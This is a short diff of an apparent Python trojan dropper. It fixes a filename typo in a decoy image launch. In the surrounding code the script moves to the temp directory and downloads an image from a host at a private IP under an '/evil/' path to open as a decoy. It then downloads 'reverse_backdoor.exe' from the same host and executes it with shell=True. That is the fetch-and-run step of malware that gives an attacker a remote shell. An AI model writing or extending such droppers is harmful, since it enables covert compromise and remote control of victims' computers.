@@ -19,7 +19,7 @@ temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
 
 download("http://192.168.122.108/evil/cat.jpg")
-subprocess.Popen("car.jpg", shell=True)
+subprocess.Popen("cat.jpg", shell=True)
 
 download("http://192.168.122.108/evil/reverse_backdoor.exe")
 subprocess.call("reverse_backdoor.exe", shell=True)
